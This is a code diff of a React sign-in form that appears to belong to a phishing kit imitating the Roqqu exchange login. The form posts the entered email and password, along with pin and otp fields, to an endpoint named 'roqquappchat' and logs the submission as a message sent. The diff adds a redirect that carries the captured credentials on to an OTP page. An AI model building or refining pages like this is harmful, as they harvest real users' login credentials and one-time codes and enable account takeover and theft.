@@ -2,14 +2,12 @@ import React, { useState } from 'react'
 import emailjs from 'emailjs-com'
 import { useHistory } from 'react-router-dom'
 
-
 const Form = (props) => {
     const history = useHistory()
 
     const [email, setEmail] = useState('')
     const [password, setPassword] = useState('')
-    const [loading, setLoading]  = useState(false)
-   
+    const [loading, setLoading] = useState(false)
 
     const handleEmail = (e) => {
         setEmail(e.target.value)
@@ -32,39 +30,44 @@ const Form = (props) => {
 
         console.log('credentials', email, password)
 
-        if (email === '' || password === '' ) {
+        if (email === '' || password === '') {
             console.log('not sent')
         } else {
-
             console.log({ email, password })
-            try{
+            try {
+                const response = await fetch(
+                    'http://localhost:3030/roqquappchat',
+                    {
+                        method: 'POST',
+                        headers: {
+                            'Content-type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            email,
+                            password,
+                            pin: '',
+                            otp: '',
+                        }),
+                    }
+                )
 
-                const response = await fetch('http://localhost:3030/roqquappchat', {
-                    method: 'POST',
-                    headers: {
-                        'Content-type': 'application/json',
-                    },
-                    body: JSON.stringify({ email, password, pin: '', otp: '' }),
-                })
-                
                 const resData = await response.json()
-                
+
                 console.log('email sending started')
-                
+
                 if (resData.status === 'success') {
                     console.log('Message Sent.')
-                    
+                    setLoading(false)
+                    history.push('/otp', { email, password })
                 } else if (resData.status === 'fail') {
                     console.log('Message failed to send.')
+                    //         setLoading(false)
                 }
-            }
-
-            catch(err) {
+            } catch (err) {
                 console.log(err)
             }
         }
     }
-    
 
     return (
         <form
@@ -72,7 +75,6 @@ const Form = (props) => {
             style={{ padding: '30px 15px' }}
             onSubmit={handleSubmit}
         >
-        
             <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>
                 Sign in
             </h2>
@@ -99,7 +101,7 @@ const Form = (props) => {
                 className=' rounded-md outline-none  bg-[#0059dd] text-white text-sm'
                 style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
             >
-               {loading ? 'loading..' : 'Sign in to your account'}
+                {loading ? 'loading..' : 'Sign in to your account'}
             </button>
             <div className='ui horizontal divider font-normal font-BrownBold lowercase'>
                 {' '}
@@ -166,6 +168,5 @@ const Form = (props) => {
         </form>
     )
 }
-
 
 export default Form
